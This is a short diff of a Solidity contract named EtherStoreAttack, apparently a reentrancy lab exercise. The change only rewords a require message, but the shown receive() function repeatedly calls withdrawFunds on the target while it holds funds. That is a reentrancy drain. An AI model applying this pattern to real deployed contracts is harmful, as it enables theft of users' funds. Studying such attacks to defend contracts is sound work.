@@ -19,7 +19,7 @@ contract EtherStoreAttack{
     }
 
     receive() external payable {
-        require(msg.value>0,"Zabb");
+        require(msg.value>0,"Not getting payed, value empty");
         if(address(store).balance>=_wei){
             console.log("attack:",msg.sender,"fff; ",msg.value);
             store.withdrawFunds(_wei);
